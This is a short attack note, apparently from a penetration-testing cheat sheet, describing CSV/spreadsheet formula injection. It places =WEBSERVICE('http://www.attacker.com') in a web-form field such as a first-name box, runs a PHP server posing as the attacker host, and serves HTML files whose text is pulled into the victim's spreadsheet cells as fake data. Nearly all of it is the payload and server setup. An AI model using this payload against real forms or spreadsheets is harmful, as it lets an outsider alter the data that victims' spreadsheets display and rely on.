Use Webservice Formula to Inject fake data into Speadsheet
----------------------------------------------------------
In cell "A1" enter the following - Could be "First Name" in web form
=WEBSERVICE("http://www.attacker.com")

Run attacking server 
php -S www.attacker.com:80

On attacking server create "index.html" with content you want to change the "fake data" too.
-Begin index.html
Fake Data
- End index.html

To fill in multiple cells use multiple html file
############ Begin a1.html ##################################
Fake
############ End a1.html ####################################
############ Begin a2.html ##################################
Data
############ End a2.html ####################################



